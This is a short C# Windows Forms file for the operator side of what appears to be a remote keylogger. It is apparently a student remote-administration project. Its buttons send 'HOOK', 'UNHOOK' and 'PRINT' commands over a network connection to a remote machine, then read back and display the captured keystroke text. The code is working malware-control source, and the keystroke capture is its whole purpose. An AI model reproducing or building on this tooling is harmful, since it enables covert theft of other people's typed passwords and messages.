using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace client
{
    public partial class keylog : Form
    {
        public keylog()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            String s = "HOOK";
            Program.nw.WriteLine(s);Program.nw.Flush();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            String s = "UNHOOK";
            Program.nw.WriteLine(s);Program.nw.Flush();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            String s = "PRINT";
            Program.nw.WriteLine(s);Program.nw.Flush();
            Char[] data = new Char[5000];
            int rec =Program.nr.Read(data, 0, 5000);
            if (rec == 0)
                s = "";
            else
            s = new String(data);
            txtKQ.Text += s;
        }


        private void keylog_closing(object sender, FormClosingEventArgs e)
        {
            String s = "QUIT";
            Program.nw.WriteLine(s); Program.nw.Flush();
        }

        private void butXoa_Click(object sender, EventArgs e)
        {
            txtKQ.Text = "";
        }
    }
}
